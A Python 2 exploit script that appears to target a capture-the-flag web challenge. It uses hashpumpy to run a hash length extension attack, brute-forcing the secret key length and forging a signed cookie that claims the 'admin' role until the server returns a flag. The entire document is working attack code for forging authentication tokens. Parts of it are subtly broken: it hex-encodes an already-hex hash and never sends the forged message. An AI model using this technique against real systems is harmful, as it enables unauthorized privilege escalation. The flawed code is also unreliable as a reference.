import hashpumpy
import requests
import re
from urllib import quote

original_data = ';"tseug":5:s'
original_hash = '3a4727d57463f122833d9e732f94e4e0'
append_data = ';"nimda":5:s'

for i in range(32):
    hexdigest = original_hash.encode('hex')    # hexdigest(str):      Hex-encoded result of hashing key + original_data.
    original_data = original_data              # original_data(str):  Known data used to get the hash result hexdigest.
    data_to_add = append_data                  # data_to_add(str):    Data to append
    key_length = i                             # key_length(int):     Length of unknown data prepended to the hash
    digest, message =  hashpumpy.hashpump(hexdigest, original_data, data_to_add, key_length) # hashpump(hexdigest, original_data, data_to_add, key_length) -> (digest, message)
    # print digest, message

    cookie = {
        'hsh': digest,
        'role': 's%3A5%3A"admin"%3B'
    }

    url = 'http://web.phrack.top:32785/'

    try:
        r = requests.get(url, cookies=cookie)
        print message
        if r.text.find('Your flag is') > 0:
            finded = True
            print r.text
            break

    except Exception as e:
        print e
